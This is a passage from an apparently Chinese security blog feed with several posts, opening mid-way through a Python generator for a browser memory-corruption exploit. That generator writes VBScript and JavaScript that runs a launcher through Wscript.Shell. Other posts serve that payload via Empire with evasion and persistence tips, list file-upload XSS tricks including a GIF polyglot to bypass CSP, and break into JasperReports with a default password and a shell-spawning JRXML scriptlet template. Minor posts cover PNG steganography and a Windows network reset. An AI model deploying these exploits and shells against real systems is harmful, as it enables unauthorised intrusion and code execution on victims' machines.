+= <span class="string">"            mem = leakMem(arg1, csession + 4)\n"</span></div><div class="line">code += <span class="string">"            olescript = strToInt(Mid(mem, 1, 2))\n"</span></div><div class="line">code += <span class="string">"            overwrite arg1, olescript + &amp;H174\n"</span></div><div class="line">code += <span class="string">"    Set Object = CreateObject(\"Wscript.Shell\")\n"</span></div><div class="line">code +=<span class="string">"Object.run(\""</span></div><div class="line">code += launcher + <span class="string">"\")\n"</span></div><div class="line">code += <span class="string">"        End Function\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"        Function triggerBug\n"</span></div><div class="line">code += <span class="string">"            aw.Resize()\n"</span></div><div class="line">code += <span class="string">"            Dim i\n"</span></div><div class="line">code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">code += <span class="string">"                ' 24000x2 + 6 = 48006 bytes\n"</span></div><div class="line">code += <span class="string">"                y(i) = Mid(x, 1, 24000)\n"</span></div><div class="line">code += <span class="string">"            Next\n"</span></div><div class="line">code += <span class="string">"        End Function\n"</span></div><div class="line">code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">code += <span class="string">"\n"</span></div><div class="line">code += <span class="string">"    &lt;script type=\"text/javascript\"&gt;\n"</span></div><div class="line">code += <span class="string">"        function strToInt(s)\n"</span></div><div class="line">code += <span class="string">"        &#123;\n"</span></div><div class="line">code += <span class="string">"            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n"</span></div><div class="line">code += <span class="string">"        &#125;\n"</span></div><div class="line">code += <span class="string">"        function intToStr(x)\n"</span></div><div class="line">code += <span class="string">"        &#123;\n"</span></div><div class="line">code += <span class="string">"            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n"</span></div><div class="line">code += <span class="string">"        &#125;\n"</span></div><div class="line">code += <span class="string">"        var o;\n"</span></div><div class="line">code += <span class="string">"        o = &#123;\"valueOf\": function () &#123;\n"</span></div><div class="line">code += <span class="string">"                triggerBug();\n"</span></div><div class="line">code += <span class="string">"                return 1;\n"</span></div><div class="line">code += <span class="string">"            &#125;&#125;;\n"</span></div><div class="line">code += <span class="string">"        setTimeout(function() &#123;exploit(o);&#125;, 50);\n"</span></div><div class="line">code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">code += <span class="string">"&lt;/body&gt;\n"</span></div><div class="line">code += <span class="string">"&lt;/html&gt;"</span></div><div class="line"></div><div class="line"><span class="keyword">return</span> code</div></pre></td></tr></table></figure><p>ms16.py</p><p>首先我们可以从<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="external">Github</a>获取Empire</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/1.png?resize=661%2C418&amp;ssl=1" alt="Empire Downloading"></p><p>现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/2.png?resize=661%2C418&amp;ssl=1" alt="Installing Apache2"><br>接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/3.png?resize=661%2C418&amp;ssl=1" alt="Empire Installation"><br>现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。</p><p>我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。</p><p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/4.png?resize=925%2C546&amp;ssl=1" alt="Empire Listener"><br>现在去生成我们的恶意HTML</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/5.png?resize=925%2C546&amp;ssl=1" alt="Stager Generation"></p><p>现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。</p><p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/7.png?resize=925%2C546&amp;ssl=1" alt="New Agent"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>XSS姿势——文件上传XSS</title>
      <link href="/2017/01/22/XSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS/"/>
      <url>/2017/01/22/XSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS/</url>
      <content type="html"><![CDATA[<h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><hr><p>一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。</p><h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><hr><p>首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。</p><h3 id="姿势一：文件名方式"><a href="#姿势一：文件名方式" class="headerlink" title="姿势一：文件名方式"></a>姿势一：文件名方式</h3><p>文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。</p><p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p><p>虽然我没有准备靶场，但是你可以选择在<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="external">W3Schools</a>练习这种XSS 。</p><h3 id="姿势二：Metadata"><a href="#姿势二：Metadata" class="headerlink" title="姿势二：Metadata"></a>姿势二：Metadata</h3><p>使用<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p><p>例如：</p><p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p><h3 id="姿势三：Content"><a href="#姿势三：Content" class="headerlink" title="姿势三：Content"></a>姿势三：Content</h3><p>如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS：</p><p>一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果</p><h3 id="姿势四：Source"><a href="#姿势四：Source" class="headerlink" title="姿势四：Source"></a>姿势四：Source</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击<code>alert(1)</code>）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。</p><p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p><p>要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名：</p><p>这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。</p><p>正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。</p><p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><hr><p>如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。</p><p>也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="external">here</a></p><p>原文链接：<a href="http://brutelogic.com.br/blog/" target="_blank" rel="external">http://brutelogic.com.br/blog/</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>PNG文件中的LSB隐写</title>
      <link href="/2017/01/22/PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/"/>
      <url>/2017/01/22/PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/</url>
      <content type="html"><![CDATA[<p>看到<a href="http://www.mottoin.com/88380.html" target="_blank" rel="external">Mott</a><a href="http://www.mottoin.com/88380.html" target="_blank" rel="external">oIn</a>的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。</p><p>环境：<strong>win10        python27</strong></p><p>lsb脚本使用了<a href="https://github.com/cyberinc/cloacked-pixel" target="_blank" rel="external">https://github.com/cyberinc/cloacked-pixel</a></p><p>在使用之前需要几个python包，主要说下win10下如何安装这些包</p><p><strong>1.PIL</strong></p><p>这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法：</p><p>到<a href="https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击" target="_blank" rel="external">https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击</a></p><p>主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用</p><p><strong>2.matplotlib</strong></p><p>这个包的安装直接参考官方网站的方法，注意一步一步来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python -m pip install --upgrade pip</div><div class="line">python -m pip install --upgrade numpy</div><div class="line">python -m pip install --upgrade pytz</div><div class="line">python -m pip install --upgrade pyparsing</div><div class="line">python -m pip install --upgrade cycler</div><div class="line">python -m pip install --upgrade matplotlib</div></pre></td></tr></table></figure><p>这就ok了，很简单。</p><p>接下来按照MottoIn这个玩就好了。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>win10只有edge可以打开网页</title>
      <link href="/2017/01/22/win10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5/"/>
      <url>/2017/01/22/win10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5/</url>
      <content type="html"><![CDATA[<p>按住win+x</p><p>然后选择“命令提示符（管理员）”</p><p>输入 netsh winsock reset</p><p>重启就好了。。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Hacking JasperReports-隐藏shell的特征</title>
      <link href="/2017/01/22/Hacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81/"/>
      <url>/2017/01/22/Hacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81/</url>
      <content type="html"><![CDATA[<p>不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/login.png?w=960" alt="login"></p><p>也没有用多久我们就猜解出密码是“jasperadmin”</p><p>我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。</p><h4 id="代码和小脚本"><a href="#代码和小脚本" class="headerlink" title="代码和小脚本"></a>代码和小脚本</h4><p>JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。</p><p>JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。</p><p>我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。</p><h4 id="编辑模板"><a href="#编辑模板" class="headerlink" title="编辑模板"></a>编辑模板</h4><p>我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。</p><p>shell.jrxml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="comment">&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 2016-10-04T14:01:12 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jasperReport</span> <span class="attr">xmlns</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"</span> <span class="attr">name</span>=<span class="string">"AllAccounts"</span> <span class="attr">pageWidth</span>=<span class="string">"595"</span> <span class="attr">pageHeight</span>=<span class="string">"842"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span> <span class="attr">columnWidth</span>=<span class="string">"515"</span> <span class="attr">leftMargin</span>=<span class="string">"40"</span> <span class="attr">rightMargin</span>=<span class="string">"40"</span> <span class="attr">topMargin</span>=<span class="string">"50"</span> <span class="attr">bottomMargin</span>=<span class="string">"50"</span> <span class="attr">isSummaryWithPageHeaderAndFooter</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"17f4b3c5-e096-4a65-b030-ed3bb58ce311"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.language"</span> <span class="attr">value</span>=<span class="string">"EN-US"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Normal"</span> <span class="attr">isDefault</span>=<span class="string">"true"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Bold"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isBold</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Italic"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isItalic</span>=<span class="string">"true"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"PageHeader"</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">forecolor</span>=<span class="string">"#FFFFFF"</span> <span class="attr">backcolor</span>=<span class="string">"#333333"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"detail"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">conditionExpression</span>&gt;</span>&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;<span class="tag">&lt;/<span class="name">conditionExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">backcolor</span>=<span class="string">"#E0E0E0"</span>/&gt;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;/<span class="name">conditionalStyle</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">subDataset</span> <span class="attr">name</span>=<span class="string">"Table Dataset 1"</span> <span class="attr">uuid</span>=<span class="string">"4fcc1d09-9859-48ee-bb6f-8d369bd49113"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">queryString</span>&gt;</span></div><div class="line">&lt;![CDATA[SELECT name, phone_office, billing_address_city, billing_address_street, billing_address_country FROM accounts ORDER BY billing_address_country, billing_address_city]]&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">queryString</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"phone_office"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_street"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_country"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">sortField</span> <span class="attr">name</span>=<span class="string">"billing_address_city"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variable</span> <span class="attr">name</span>=<span class="string">"CityyNumber"</span> <span class="attr">class</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">incrementType</span>=<span class="string">"Group"</span> <span class="attr">incrementGroup</span>=<span class="string">"CityGroup"</span> <span class="attr">calculation</span>=<span class="string">"Count"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">variableExpression</span>&gt;</span>&lt;![CDATA[Boolean.TRUE]]&gt;<span class="tag">&lt;/<span class="name">variableExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">initialValueExpression</span>&gt;</span>&lt;![CDATA[new Integer(0)]]&gt;<span class="tag">&lt;/<span class="name">initialValueExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">variable</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">"CityGroup"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">groupExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_city&#125;]]&gt;<span class="tag">&lt;/<span class="name">groupExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">subDataset</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"79"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"227"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">uuid</span>=<span class="string">"32a2a8ff-d90a-48d7-b044-5325b5c6264f"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"40"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"515"</span> <span class="attr">height</span>=<span class="string">"1"</span> <span class="attr">uuid</span>=<span class="string">"19826638-0487-4bb5-9b15-7e7af63b8dce"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.table"</span> <span class="attr">value</span>=<span class="string">"end"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">line</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"80"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"6f072af1-756c-49f4-82f3-af59e8124296"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Right"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Page " + String.valueOf($V&#123;PAGE_NUMBER&#125;) + " of"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span> <span class="attr">evaluationTime</span>=<span class="string">"Report"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">x</span>=<span class="string">"280"</span> <span class="attr">y</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"75"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">uuid</span>=<span class="string">"02b15e9e-d360-4b82-a140-54b9bd3b0e81"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textElement</span> <span class="attr">textAlignment</span>=<span class="string">"Left"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[" " + String.valueOf($V&#123;PAGE_NUMBER&#125;)]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">pageFooter</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">band</span> <span class="attr">height</span>=<span class="string">"149"</span> <span class="attr">splitType</span>=<span class="string">"Stretch"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">scaleImage</span>=<span class="string">"Clip"</span> <span class="attr">hAlign</span>=<span class="string">"Right"</span> <span class="attr">vAlign</span>=<span class="string">"Middle"</span> <span class="attr">onErrorType</span>=<span class="string">"Icon"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"250"</span> <span class="attr">height</span>=<span class="string">"70"</span> <span class="attr">uuid</span>=<span class="string">"aa8a8976-039f-45ac-84f3-d8d55b442410"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">imageExpression</span>&gt;</span>&lt;![CDATA["repo:LogoLink"]]&gt;<span class="tag">&lt;/<span class="name">imageExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hyperlinkTooltipExpression</span>&gt;</span>&lt;![CDATA["JasperReports 